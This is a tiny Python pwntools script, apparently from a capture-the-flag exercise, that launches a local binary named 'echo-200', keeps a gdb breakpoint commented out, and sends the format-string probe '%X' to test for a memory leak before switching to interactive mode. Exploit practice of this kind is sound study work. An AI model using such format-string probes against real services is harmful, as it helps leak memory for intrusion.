from pwn import *

context(log_level ="debug")

p = process("./echo-200")
#gdb.attach(p,"b*0x8048fb6")
p.recvuntil("\n")
p.sendline("%X")
p.interactive()
